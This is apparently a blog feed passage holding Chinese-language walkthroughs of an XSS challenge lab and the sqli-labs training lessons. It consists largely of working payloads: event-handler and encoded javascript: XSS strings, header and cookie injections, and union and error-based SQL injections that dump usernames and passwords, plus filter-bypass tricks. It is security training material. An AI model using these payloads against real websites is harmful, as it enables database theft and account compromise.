+<pre><code class="language-html">&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0027;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x0027;&amp;#x0029;
+</code></pre>
+<p>或者</p>
+<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;
+</code></pre>
+<h2 id="level9">level9</h2>
+<p>需要具有http://的字段</p>
+<p>于是</p>
+<pre><code class="language-html">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;http://&amp;#39;&amp;#41;
+</code></pre>
+<p>加上http://即可</p>
+<h2 id="level10">level10</h2>
+<p>查看源码发现只有t_sort可以利用，但是在没有源码的情况下如何测试？</p>
+<pre><code class="language-html">&amp;t_link=&quot; type=&quot;text&quot; &amp;t_history=&quot; type=&quot;text&quot; &amp;t_sort=&quot; type=&quot;text&quot;
+</code></pre>
+<p>直接将其放入url发现只有t_sort有反应</p>
+<p>然后就可以直接构造payload</p>
+<pre><code class="language-html">&amp;t_sort=&quot; type=&quot;text” onmouseover=&quot;javascript:alert(1)
+</code></pre>
+<h2 id="level11">level11</h2>
+<pre><code class="language-html">&amp;t_link=&quot;type=&quot;text&amp;t_history=&quot;type=&quot;text&amp;t_sort=&quot;type=&quot;text&amp;t_ref=&quot;type=&quot;text
+</code></pre>
+<p>依然是t_sort有反应，把上一题的payload扔进去，发现”“转码了</p>
+<p>使用unicode试试，发现传不进去</p>
+<p>只能看源码了，发现直接跟refer有关，因此需要抓包了</p>
+<p>然后发现refer直接传到t_ref的value中</p>
+<p>于是可以直接构造</p>
+<pre><code class="language-html">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)
+</code></pre>
+<h2 id="level12">level12</h2>
+<p>在UA处进行注入</p>
+<pre><code class="language-html">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)
+</code></pre>
+<h2 id="level13">level13</h2>
+<p>靶场好像出了一点点问题</p>
+<p>出现了不正常的warning，问题不大，看了源码后就可以直接发现是cookie</p>
+<h2 id="level14">level14</h2>
+<p>整个网页有问题没法做</p>
+<p>最终的payload为</p>
+<pre><code class="language-html">'&quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'
+</code></pre>
+<p>原理为img的链接不存在会直接执行报错语句</p>
+<h2 id="level15">level15</h2>
+<p>刚开始有一个404界面，删去src之后正常了</p>
+<p>那么src就是其中的一个注入点，看源码之后发现其中有一个ng-include:在body里面</p>
+<p>那么根据查了一下资料</p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+<pre><code class="language-html">&lt;element ng-include=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/element&gt;
+</code></pre>
+<p>ng-include 指令作为元素使用:</p>
+<pre><code class="language-html">&lt;ng-include src=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/ng-include&gt;
+</code></pre>
+<p>也就是说可以利用同域名下的网页包含xss</p>
+<pre><code class="language-html">level1.php?name=&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<p>但是没法成功</p>
+<pre><code class="language-html">?src='level1.php?name=&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;'
+?src='level1.php?name=&lt;input onclick=alert(&quot;xss&quot;)&gt;'
+?src='level1.php?name=&lt;a href=&quot;javascript:alert(233)&quot;&gt;xss&lt;/a&gt;'
+</code></pre>
+<p>上面都是可行的（不知道为什么）</p>
+<h2 id="level16">level16</h2>
+<p>过滤了空格和/</p>
+<p>可以用%0a,%0d代替</p>
+<pre><code class="language-html">&lt;img%0asrc=2%0aonerror=alert(1)&gt;
+
+&lt;img%0dsrc=2%0donerror=alert(1)&gt;
+</code></pre>
+<h2 id="level17-20">level17-20</h2>
+<p>插件不支持(IE也只能支持17和18，19出bug)</p>
+<pre><code class="language-html">?arg01=a&amp;arg02=b%20onmouseover=%27javascript:alert(1)%27
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[sqli-lab]]></title>
+        <id>https://gudiffany.github.io/post/sqli-lab-wp/</id>
+        <link href="https://gudiffany.github.io/post/sqli-lab-wp/">
+        </link>
+        <updated>2022-08-14T05:11:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="sqli-labs">sqli-labs</h1>
+<h2 id="less1">less1</h2>
+<ol>
+<li>先判断注入类型</li>
+</ol>
+<pre><code class="language-mysql">http://localhost/sqli-labs-master/Less-1/?id=1 and 1=1
+</code></pre>
+<p>和</p>
+<pre><code class="language-mysql">http://localhost/sqli-labs-master/Less-1/?id=1 and 1=2
+</code></pre>
+<p>回显正常</p>
+<pre><code class="language-mysql">http://localhost/sqli-labs-master/Less-1/?id=1' and '1'='2
+</code></pre>
+<p>无回显，说明语句正确，逻辑错误，存在字符注入</p>
+<p>查出最大的列数</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=1' order by 4--+
+</code></pre>
+<p>数据库</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,database(),3--+
+</code></pre>
+<p>表</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3--+
+</code></pre>
+<p>列</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),3--+
+</code></pre>
+<p>字段</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(username,password)from users),3--+
+</code></pre>
+<h2 id="less2">less2</h2>
+<p>方法与1同即可（但为数字型注入，无需--+）</p>
+<pre><code>http://localhost/sqli-labs-master/Less-2/?id=1 and 1=2
+</code></pre>
+<p>判断为数字型</p>
+<p>最后查询url为</p>
+<pre><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,(select group_concat(username,password)from users),3
+</code></pre>
+<h2 id="less3">less3</h2>
+<p>首先判断不是数字型，然后用字符型判断一下</p>
+<pre><code>http://localhost/sqli-labs-master/Less-3/?id=1'
+</code></pre>
+<p>发现多出一个）括号错误提示，加上）--+，回显正常，然后更深入判断闭合方式</p>
+<pre><code>http://localhost/sqli-labs-master/Less-3/?id=1') and ('1')=('1
+</code></pre>
+<p>发现闭合方式为（‘ ’）</p>
+<p>接下来沿用上面的注入语句即可</p>
+<pre><code>http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,(select group_concat(username,password)from users),3--+
+</code></pre>
+<h2 id="less4">less4</h2>
+<p>字符型，但是是双引号闭合的字符型，还要加上）</p>
+<pre><code>http://localhost/sqli-labs-master/Less-4/?id=1&quot;) and (&quot;1&quot;)=(&quot;1
+</code></pre>
+<p>最后</p>
+<pre><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,(select group_concat(username,password)from users),3--+
+</code></pre>
+<h2 id="less5">less5</h2>
+<p>本题不存在数据显示，所以union不起作用。如果数据不显示只有对错页面显示我们可以选择布尔盲注</p>
+<p>首先判断出是单引号闭合才出现报错</p>
+<pre><code>http://localhost/sqli-labs-master/Less-5/?id=1'
+</code></pre>
+<p>剩下的难题就是写脚本了（写了好久）</p>
+<h2 id="less6-less8">less6-less8</h2>
+<p>都是属于布尔盲注，需要先判断基本的报错类型，然后用脚本即可</p>
+<h2 id="less9-10">less9-10</h2>
+<p>不存在报错与正确页面，属于时间盲注(需要先构造database（）长度的语句判断闭合方式)</p>
+<p>剩下的还是脚本</p>
+<h2 id="less11-less16">less11-less16</h2>
+<p>为基于post的报错和布尔盲注，只要把get的改改就可以了</p>
+<h2 id="less17">less17</h2>
+<h3 id="1extractvalue">1.extractvalue</h3>
+<pre><code>1' and (extractvalue(1,concat('#',version(),'#')))#    爆版本
+
+1' and (extractvalue(1,concat('#',database(),'#')))#   爆数据库
+
+1' and (extractvalue(1,concat('#',(select table_name from information_schema.tables where table_schema=database() limit 1,1 ),'#')))#   爆表名
+
+1' and (extractvalue(1,concat('#',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),'#')))# 
+ 爆字段名
+
+1' and (extractvalue(1,concat('#',(select password from (select password from users where username='admin1') b) ,'#')))#      爆字段内容该格式针对mysql数据库。
+
+**需要再套一层select，select出的结果再通过中间表select一遍，这样就规避了错误。注意，这个问题只出现于mysql，mssql和Oracle不会出现此问题。**
+
+1' and (extractvalue(1,concat('#',(select group_concat(username,password) from users),'#')))#                      爆字段内容。
+
+**出现无法显示所有字段的情况加入limit进行脚本爆破即可
+</code></pre>
+<h3 id="2updatexml">2.updatexml</h3>
+<pre><code>123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
+123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
+   爆字段名
+
+123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
+
+1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
+</code></pre>
+<h3 id="3floor">3.floor</h3>
+<pre><code>select count(*) from information_schema.tables group by concat('#',语句,floor(rand(0)*2))基本语句格式
+
+123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
+
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+
+1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+</code></pre>
+<h2 id="less18-20">less18-20</h2>
+<p>通过更改表头进行注入</p>
+<pre><code>18：User-Agent:1' and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and '
+
+19：Referer: 1' and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and '
+
+20.Cookie: uname=1' and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and '
+</code></pre>
+<h2 id="less21">less21</h2>
+<p>经过base64加密，单引号闭合</p>
+<pre><code>Cookie: uname=MScgYW5kICh1cGRhdGV4bWwgKDEsY29uY2F0KDB4NWMsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpLDB4NWMpLDEpKSBhbmQgJw==
+</code></pre>
+<h2 id="less22">less22</h2>
+<p>双引号闭合</p>
+<pre><code>Cookie: uname=MSIgYW5kICh1cGRhdGV4bWwgKDEsY29uY2F0KDB4NWMsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpLDB4NWMpLDEpKSBhbmQgIg==
+</code></pre>
+<h2 id="less23">less23</h2>
+<pre><code>http://localhost/sqli-labs-master/Less-23/?id=1' and '1'='1
+</code></pre>
+<p>但是没办法通过--+来进行注释</p>
+<p>于是需要通过联合注入加上后面的‘1’=‘1来规避</p>
+<pre><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),3 and '1'='1
+</code></pre>
+<h2 id="less24">less24</h2>
+<p>根据测试，password都进行了限制，无法进行注入，但是用户名没有限制，而且有可以创造新用户的功能，尝试对用户名进行处理</p>
+<p>创造新用户admin’#</p>
+<p>对admin‘#更改密码</p>
+<p>用于没有对用户名进行限制，会直接对admin进行更改密码</p>
+<p>于是直接对admin进行登录</p>
+<h2 id="less25">less25</h2>
+<p>过滤所有的and和or字段</p>
+<p>绕过的方法有很多</p>
+<p>1.大小写转化（不行）</p>
+<p>2.双写</p>
+<pre><code>http://localhost/sqli-labs-master/Less-25/?id=-1' union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema = 'security')--+
+</code></pre>
+<p>对information也要双写</p>
+<p>3.利用符号形式（只对实际的or和and起作用，对单词内还是需要双写）</p>
+<p>||---or</p>
+<p>%26%26---and</p>
+<h2 id="less25a">less25a</h2>
+<p>将之前的脚本改一改</p>
+<p>1.information处，and处</p>
+<p>2.回显处改为Dumb（因为没有报错界面）</p>
+<h2 id="less26">less26</h2>
+<p>过滤了空格和注释，and，or</p>
+]]></content>
+    </entry>
+</feed>
